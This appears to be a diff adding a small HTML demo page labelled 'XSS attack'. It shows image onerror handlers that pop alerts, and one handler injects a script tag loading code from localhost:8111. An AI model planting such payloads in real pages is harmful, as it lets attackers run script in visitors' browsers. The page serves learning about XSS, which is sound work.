@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <img src="err.png" onerror="(function(){
+        alert('xss')
+        var oHead = document.getElementsByTagName('head');
+        var script = document.createElement('script');
+        script.src = 'http://localhost:8111';
+        oHead[0].appendChild(script);
+    })()">
+    <img src="err.png" onerror="javascript:alert('onerror')">
+    <a href="localhost:8111/?q=111&p=222">XSS攻击</a>
+</body>
+</html>
